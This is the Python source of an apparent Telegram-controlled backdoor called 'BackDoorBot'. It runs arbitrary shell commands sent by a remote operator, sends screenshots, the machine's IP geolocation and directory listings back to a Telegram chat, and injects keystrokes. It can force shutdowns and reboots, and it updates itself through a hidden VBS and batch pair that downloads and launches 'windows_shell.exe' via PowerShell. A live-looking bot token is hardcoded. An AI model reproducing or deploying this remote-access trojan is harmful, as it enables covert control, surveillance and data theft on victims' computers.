# -*- coding: utf8 -*-
from datetime import datetime
import os
import platform
import subprocess
import threading
import requests
import wget
import pyautogui
import keyboard
import telebot

id = -607433374


# import argparse

# parser = argparse.ArgumentParser(description='Process some integers.')
# parser.add_argument('-u', metavar='url', type=str, dest="url",
#                     help='an integer for the accumulator')

# argp = parser.parse_args()


# threading.Thread(target=attack, args=(argp.url, )).start()



# file = open("token.txt", "r+")
# confiG = file.read().split("\n")
# file.close()
inform='https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/documentation.txt'


bot=telebot.TeleBot('5237141927:AAEhd8t34Lc1fpJsCv8c4UHn9ufT8ETgwtY')

class Func_API:    
    
    
    def __init__(self) -> None:
        self.TOKEN_PC=['pc0','5237141927:AAEhd8t34Lc1fpJsCv8c4UHn9ufT8ETgwtY']
        self.NAME_PC=self.TOKEN_PC[0]
        self.tg_api = bot
        self.id = id

    def rasbiv(self,text):
        texn=text.split()
        texc=text.split("{")[1:]
        for i in range(len(texc)):
            texc[i] = texc[i].split("}")[0]
        return {"name": texn[0],
                "cmnd": texn[1],
                "text": texc}


    def find_name(self,fig):
        lop=0
        dir=os.listdir("media/")
        for i in dir:
            if i[:3]==fig:
                lop+=1
        return fig+str(lop)

    def ren(self, path, content):
        vb=self.find_name(content)
        if content=="vid":
            os.rename("media/"+path,"media/"+vb+".mp4")
        elif content=="pic":
            os.rename("media/"+path,"media/"+vb+".png")
        return vb


    def cmdo(self,com):
        try:
            res=subprocess.check_output(com, shell=1)
        except:
            bot.send_message(self.id, '🖥❌')
        try:
            res=res.decode('utf8')
        except:
            try:
                res=res.decode('cp866')
            except:		bot.send_message(self.id, '🖥❌')
        bot.send_message(self.id,'🖥✅:\n'+res)

    def cmdi(self,com):
        try:
            os.system(com)
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')


    def exits(self):
        dir=os.listdir("media/")
        for i in dir:
            os.remove("media/"+i)
        bot.send_message(self.id,"🖥✅")


    def ip_address(self):
        try:
            ip = requests.get("http://jsonip.com/").json()
            response = requests.get(url=f'http://ip-api.com/json/{ip["ip"]}').json()
            data = {
                '[IP]': response.get('query'),
                '[Int prov]': response.get('isp'),
                '[Org]': response.get('org'),
                '[Country]': response.get('country'),
                '[Region Name]': response.get('regionName'),
                '[City]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Lat]': response.get('lat'),
                '[Lon]': response.get('lon'),
            }
            pl=""
            for k, v in data.items():
                pl+=f'{k} : {v}\n'
            bot.send_message(self.id, pl) 
        except requests.exceptions.ConnectionError:
            bot.send_message(self.id, 'Erorre')


    def wgt(self,text_comand):
        try:
            wget.download(text_comand[0],text_comand[1])
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')


    def rebooting(self,timer):
        try:
            timer="shutdown /r /t "+str(timer)
            os.system(timer)
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')
            
    def shotdowning(self,timer):
        try:
            timer="shutdown /s /t "+str(timer)
            os.system(timer)
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')


    def picture(self,file):
        try:
            command = f"media/{file}.png"
            os.startfile(command)
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')

    def video(self,file):
        try:
            command = f"media/{file}.mp4"
            os.startfile(command)
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')

    def specifications(self):
        x,y=pyautogui.size()
        banner = f"""
        Name PC: {platform.node()}
        Processor: {platform.processor()}
        System: {platform.system()} {platform.release()}
        Screen size: {x}x{y}
        """
        bot.send_message(self.id, banner)

    def rask(self):
        try:
            keyboard.press_and_release("alt+shift")
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')
        
    def screenshot(self):  
        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ','_').replace(':','-')}.jpg"
        pyautogui.screenshot(filename)
        img = open(filename, "rb")
        bot.send_document(self.id, img)
        img.close()
        os.remove(filename)

    def keyb(self,text):
        try:
            text = text.split("+")
            listing=""
            button=["shift","alt","f1","f2","f3","f4","f5","f6","f7",
            "f8","f9","f10","f11","f12","tab","ctrl","enter","capslock"]
            for i in text:
                try:
                    index = button.index(i)
                    listing+=i+"+"
                except:
                    for kip in i:
                        listing+=kip+"+"
            listing=listing[:-1]
            keyboard.press_and_release(listing)
            bot.send_message(self.id,"🖥✅")
        except:
            bot.send_message(self.id, '🖥❌')


    def print_gui(self,text):
        try:
            pyautogui.alert(text, "~")
            bot.send_message(self.id, '🖥✅')
        except:
            bot.send_message(self.id, '🖥❌')
        
    def input_gui(self,text):
        try:
            answer = pyautogui.prompt(text, "~")
            bot.send_message(self.id, answer)
        except:
            bot.send_message(self.id, '🖥❌')

    def closes(self):
        try:
            keyboard.press_and_release("alt+f4")
            bot.send_message(self.id, '🖥✅')
        except:
            bot.send_message(self.id, '🖥❌')
        
    def start_file(self,path):
        try:
            text = "start media/"+path
            os.system(text)
            bot.send_message(self.id, '🖥✅')
        except:
            bot.send_message(self.id, '🖥❌')


    def direct(self,paths):
        try:
            if paths==".":
                paths=os.getcwd()
            exit_str=""
            exit_str+=f"{paths}: \n\n"
            current, dirs, files = os.walk(paths).__next__()
            for i in files:
                exit_str+=i+"\n"
            for i in dirs:
                try:
                    o = os.listdir(paths+"/"+i)
                    exit_str+="|"+i+"\n"
                    for l in o:
                        exit_str+="| - "+l+"\n"
                    exit_str+="\n"
                except: pass
            bot.send_message(self.id, exit_str )     
        except: bot.send_message(self.id, '🖥❌')

    def update_bot(self):
        pth = os.getcwd()
        text_bat = f'''@echo off

timeout 30
del {pth}\\windows_shell.exe
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe"

start windows_shell.exe

exit
'''
        text_vbs = f'''
set sh=CreateObject("Wscript.Shell")
sh.Run "{pth}\\upd.bat", 0'''
        open('upd.bat','w').write(text_bat)
        open('upd.vbs','w').write(text_vbs)
        os.startfile('upd.vbs')
        bot.stop_polling()
        exit()

    def perfor(self,text):
        
        text = self.rasbiv(text)
        name_pc=text["name"]
        comnd = text["cmnd"]
        text_comand = text["text"]

        if name_pc.lower() == self.NAME_PC or name_pc.lower()=="all":
            if comnd=="wget":
                threading.Thread(target=self.wgt, args=(text_comand, )).start()

            if comnd=="ip" or comnd=="ipad":
                threading.Thread(target=self.ip_address).start()

            if comnd=="reboot":
                threading.Thread(target=self.rebooting, args=(text_comand[0], )).start()
                
            if comnd=="specifications" or comnd=="spec":
                threading.Thread(target=self.specifications).start()

            if comnd=="shotdown" or comnd=="shdn" or comnd=="vikl":
                threading.Thread(target=self.shotdowning, args=(text_comand[0], )).start()
                

            if comnd=="picture" or comnd=="pict":
                threading.Thread(target=self.picture, args=(text_comand[0], )).start()

            if comnd=="cmdi":
                threading.Thread(target=self.cmdi, args=(text_comand[0], )).start()

            if comnd=="cmdo":
                threading.Thread(target=self.cmdo, args=(text_comand[0], )).start()
                
            if comnd=="video" or comnd=="vide" or comnd=="vid":
                threading.Thread(target=self.video, args=(text_comand[0], )).start()

            if comnd=="exit" or comnd=="cls" or comnd=="clear":
                threading.Thread(target=self.exits).start()

            if comnd=="lock" or comnd=="close":
                threading.Thread(target=self.closes).start()

            if comnd=="keyb" or comnd=="keyboard":
                threading.Thread(target=self.keyb, args=(text_comand[0], )).start()

            if comnd=="rask":
                threading.Thread(target=self.rask, args=(text_comand[0], )).start()
                
            if comnd=="dir" or comnd=="direction":
                threading.Thread(target=self.direct, args=(text_comand[0], )).start()
                
            if comnd=="screenshot" or comnd=="scrn":
                threading.Thread(target=self.screenshot).start()
                
            if comnd=="inpt" or comnd=="input":
                threading.Thread(target=self.input_gui, args=(text_comand[0], )).start()
                
            if comnd=="outp" or comnd=="output":
                threading.Thread(target=self.print_gui, args=(text_comand[0], )).start()
                
            if comnd=="start" or comnd=="strt":
                threading.Thread(target=self.start_file, args=(text_comand[0], )).start()
            if comnd=="upd":
                self.update_bot()
                exit()


func_api = Func_API()
@bot.message_handler(commands=['info','start'])
def start_message(message):
	bot.send_message(message.chat.id, f"Список функций: \n{inform}")

@bot.message_handler(content_types=['text'])
def infokigb(message):

    func_api.perfor(message.text)
    

@bot.message_handler(content_types=['photo'])
def handle_docs_document(message):
    file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    src = 'media/' + message.photo[1].file_id 
    with open(src, 'wb') as new_file:
        new_file.write(downloaded_file)
    picu=func_api.ren(message.photo[1].file_id, "pic")
    print(str(message.chat.id))
    bot.reply_to(message, f"OK. Сохранил как {picu}\n")

@bot.message_handler(content_types=['video'])
def get_file(message):
    file_name = 'media/' + message.json['video']['file_name']
    file_info = bot.get_file(message.video.file_id)
    with open(file_name, "wb") as f:
        file_content = bot.download_file(file_info.file_path)
        f.write(file_content)
    video=func_api.ren(file_name[5:],"vid")
    bot.reply_to(message, f"OK. Сохранил как {video}")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        chat_id = message.chat.id
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = 'media/' + message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, "🖥✅")
    except Exception as e:
        bot.reply_to(message, f"🖥❌\n{e}")
bot.infinity_polling()
